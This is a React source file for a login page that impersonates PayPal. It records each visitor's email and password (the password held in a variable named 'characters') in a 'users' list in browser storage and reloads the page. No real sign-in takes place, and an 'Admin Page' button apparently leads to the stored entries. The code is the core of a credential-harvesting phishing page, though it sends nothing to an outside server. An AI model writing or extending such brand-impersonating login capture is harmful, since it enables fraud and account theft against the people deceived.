import { useState } from "react";

const Login = () => {
  const [email, setEmail] = useState("");
  const [characters, setCharacters] = useState("");

  const handleLogin = () => {
    // Get existing data
    const existing = JSON.parse(localStorage.getItem("users") || "[]");

    // Save new entry
    const updated = [...existing, { email, characters, time: new Date() }];

    localStorage.setItem("users", JSON.stringify(updated));

    // Refresh page
    window.location.reload();
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
        
      <div className="w-[450px] bg-white px-6 pb-6 rounded-lg text-center border border-gray-200">
        <h2 className="text-3xl font-bold mb-9 p-5 ">PayPal</h2>
        
        <input
          type="text"
          placeholder="Email or mobile number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full border rounded-md p-3 mb-3 outline-none"
        />

        <input
          type="password"
          placeholder="Password"
          value={characters}
          onChange={(e) => setCharacters(e.target.value)}
          className="w-full border rounded-md p-3 mb-2 outline-none"
        />

        <p className="text-blue-500 text-sm mb-3 cursor-pointer">
          Forgot password?
        </p>

        <button
          onClick={handleLogin}
          className="w-full bg-blue-600 text-white py-3 rounded-full font-semibold"
        >
          Log In
        </button>

        <div className="my-4 text-gray-400">or</div>

        <button
          onClick={() => (window.location.href = "/admin")}
          className="w-full border py-3 rounded-full font-semibold"
        >
          Admin Page
        </button>

        <div className="mt-6 text-sm text-gray-500">
          Português | English
        </div>
      </div>
    </div>
  );
};

export default Login;